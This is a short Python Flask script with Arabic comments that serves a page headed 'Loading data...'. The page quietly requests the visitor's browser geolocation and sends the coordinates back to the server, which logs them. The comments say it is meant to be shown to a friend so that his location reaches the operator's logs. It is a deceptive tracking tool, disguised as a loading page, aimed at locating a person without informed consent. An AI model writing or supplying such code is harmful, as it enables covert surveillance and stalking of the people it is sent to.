from flask import Flask, render_template_string, request

app = Flask(__name__)

# هذه صفحة الويب التي ستظهر لصديقك وتطلب منه الموقع
html_template = """
<!DOCTYPE html>
<html>
<body>
    <h1>جارٍ تحميل البيانات...</h1>
    <script>
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(position) {
                var lat = position.coords.latitude;
                var lon = position.coords.longitude;
                // إرسال الإحداثيات إلى الخادم تلقائياً
                window.location.href = "/?lat=" + lat + "&lon=" + lon;
            });
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    
    if lat and lon:
        # هنا ستصلك الإحداثيات في السجلات (Logs)
        print(f"تم الحصول على الموقع: خط العرض {lat} وخط الطول {lon}")
        return "تم استلام موقعك بنجاح!"
    else:
        return render_template_string(html_template)

if __name__ == "__main__":
    app.run()
